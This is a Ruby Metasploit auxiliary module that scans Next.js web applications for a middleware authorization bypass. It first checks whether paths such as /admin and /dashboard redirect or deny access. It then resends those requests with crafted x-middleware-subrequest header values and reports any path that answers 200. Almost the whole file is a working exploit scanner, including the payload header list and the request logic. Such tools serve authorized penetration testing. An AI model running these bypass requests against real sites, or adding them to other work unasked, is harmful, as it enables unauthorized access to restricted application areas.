##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::Scanner
    include Msf::Auxiliary::Report
  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name'           => 'Next.js Middleware Bypass Scanner',
          'Description'    => %q{
            This module tests for Next.js middleware bypass vulnerabilities by sending
            specific x-middleware-subrequest headers to potential restricted paths.
            It attempts to bypass security controls implemented through Next.js middleware
            by exploiting common header validation issues.
          },
          'Author'         => [ 'Aryan K' ],
          'License'        => MSF_LICENSE,
          'References'     => [
            [ 'URL', 'https://github.com/Ba3a-G/nextjs-notes-app' ]
          ],
          'DisclosureDate' => '2025-04-28'
        )
      )
  
      register_options(
        [
          OptString.new('TARGETURI', [ true, 'Base path for the application', '/']),
          OptString.new('PATHS', [ true, 'Comma-separated list of paths to test (e.g., /admin,/dashboard)', '/admin,/dashboard']),
          OptBool.new('VERBOSE', [ false, 'Enable verbose output', false]),
        ]
      )
    end
  
    def intervention_status_codes
      [301, 302, 307, 308, 401, 403, 405]
    end
  
    def subrequest_headers
      [
        {'x-middleware-subrequest' => 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'},
        {'x-middleware-subrequest' => 'middleware:middleware:middleware:middleware:middleware'},
        {'x-middleware-subrequest' => 'src/middleware'},
        {'x-middleware-subrequest' => 'middleware'},
        {'x-middleware-subrequest' => 'pages/_middleware'},
        {'x-middleware-subrequest' => '1'},
      ]
    end
  
    def check_is_nextjs
      uri = normalize_uri(target_uri.path)
      
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => uri
      })
  
      return false unless res
      
      powered_by = res.headers['X-Powered-By'] || ''
      server = res.headers['Server'] || ''
      
      if datastore['VERBOSE']
        print_status("Server: #{server[0..20]}")
        print_status("X-Powered-By: #{powered_by[0..20]}")
      end
      
      if powered_by.downcase.include?('next.js')
        print_good("Detected Next.js server")
        return true
      end
      
      print_status("Next.js not detected from headers")
      return false
    end
  
    def test_path(path)
      uri = normalize_uri(target_uri.path, path)
      
      # Check initial access
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => uri
      })
      
      return false unless res
      
      if intervention_status_codes.include?(res.code)
        print_status("Path '#{path}' returned intervention status #{res.code} - testing bypass")
        return test_bypass_headers(path)
      elsif datastore['VERBOSE']
        print_status("Path '#{path}' returned status #{res.code} - no intervention detected")
      end
      
      return false
    end
  
    def test_bypass_headers(path)
      uri = normalize_uri(target_uri.path, path)
      bypass_found = false
      
      subrequest_headers.each do |header|
        header_name = header.keys.first
        header_value = header[header_name]
        
        if datastore['VERBOSE']
          print_status("Testing header: #{header_name}: #{header_value[0..30]}...")
        end
        
        res = send_request_cgi({
          'method' => 'GET',
          'uri' => uri,
          'headers' => header
        })
        
        next unless res
        
        if res.code == 200
          print_good("BYPASS FOUND: Path '#{path}' with header '#{header_name}: #{header_value}'")
          
          report_vuln(
            host: rhost,
            port: rport,
            name: 'Next.js Middleware Bypass',
            refs: references,
            info: "Successfully bypassed access control at path '#{path}' using '#{header_name}: #{header_value}'"
          )
          
          bypass_found = true
        elsif datastore['VERBOSE']
          print_status("Header '#{header_name}' returned status #{res.code}")
        end
      end
      
      return bypass_found
    end
  
    def run_host(ip)
      print_status("Testing Next.js Middleware bypass on #{vhost}:#{rport}")
      
      is_nextjs = check_is_nextjs
      print_status("Continuing scan regardless of Next.js detection") unless is_nextjs
      
      paths = datastore['PATHS'].split(',').map(&:strip)
      print_status("Testing #{paths.length} paths")
      
      bypasses_found = 0
      
      paths.each do |path|
        if test_path(path)
          bypasses_found += 1
        end
      end
      
      if bypasses_found > 0
        print_good("Scan complete: Found #{bypasses_found} bypasses")
      else
        print_status("Scan complete: No bypasses found")
      end
    end
  end